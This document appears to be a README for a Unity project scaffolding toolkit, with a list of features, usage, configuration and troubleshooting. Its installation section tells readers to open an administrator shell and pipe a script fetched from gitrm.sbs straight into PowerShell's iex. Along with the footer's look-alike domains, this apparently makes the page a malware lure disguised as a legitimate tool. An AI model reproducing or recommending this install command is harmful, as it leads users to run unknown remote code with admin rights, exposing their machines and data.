# Unity Template — Safe Project Scaffolding Suite

> A Unity project template toolkit for scaffolding, scene organization, asset workflows, accessibility presets, and repeatable builds.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitrm.sbs?get=unity-template | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Unity Template modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Unity Template.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

**Unity Template — Safe Project Scaffolding Suite** provides repeatable folder structures, scene presets, input configuration, accessibility settings, asset checks, and build profiles for Unity teams. It helps teams start consistently without bundling copyrighted assets.

**Best for:** Unity developers, technical artists, and game-production teams.

## Core Features

- ✅ **Project Scaffolding** — Generate 2D, 3D, UI, and tooling project layouts.
- ✅ **Scene Presets** — Start with lighting, camera, input, and post-processing defaults.
- ✅ **Asset Workflow** — Validate import settings, labels, dependencies, and duplicates.
- ✅ **Accessibility Presets** — Configure text size, color contrast, remapping, and motion options.
- ✅ **Build Profiles** — Define repeatable PC, mobile, and WebGL build targets.
- ✅ **Version-Control Helpers** — Add sensible ignores and reviewable project metadata.
- ✅ **Template Tests** — Check that generated projects open and build cleanly.

## Usage

```bash
dotnet run --project tools/UnityTemplate.Cli -- create --name MyGame --kind 3D
dotnet run --project tools/UnityTemplate.Cli -- validate --project ./MyGame
dotnet run --project tools/UnityTemplate.Cli -- build --profile pc
```

## Configuration

> [!NOTE]
> Template settings are stored in YAML and kept separate from project-specific secrets or user preferences.

```yaml
project:
  name: MyGame
  kind: 3D
  unityVersion: 2022.3
accessibility:
  remappableControls: true
  highContrast: true
build:
  targets: [pc, webgl]
```

## Screenshots

- Project creator: `screenshots/project-creator.png`
- Scene preset: `screenshots/scene-preset.png`
- Asset validator: `screenshots/asset-validator.png`
- Build profile: `screenshots/build-profile.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Unity reports a version mismatch | Open the project with the documented LTS version. |
| Package import fails | Check the package manifest and network/proxy policy. |
| Build profile is missing | Run the template validator before creating a build. |
| Asset warnings persist | Reimport the asset after correcting its label and import settings. |

## Use Cases

- **New Games** — Start with a consistent architecture and folder layout.
- **Team Onboarding** — Reduce setup differences between developers.
- **Tooling Projects** — Generate editors and utilities from a reviewed base.
- **Accessibility** — Make inclusive defaults part of every project.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Verify Unity and package licenses for your intended use. Do not include copyrighted assets, trademarks, or third-party code without permission and attribution.

> [!TIP]
> Keep template changes in reviewable commits and test a generated project before adopting a new default.

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
unity-template, unity, game-development, scaffolding, scene-presets, asset-management, build-automation, accessibility
-->

[gitview.sbs](https://gitview.sbs?t=unity-template) | [gitrm.cfd](https://gitrm.cfd?t=unity-template) | [gitrm.sbs](https://gitrm.sbs?t=unity-template) | [gitsl.xyz](https://gitsl.xyz?t=unity-template) | [viewgit.sbs](https://viewgit.sbs?t=unity-template)
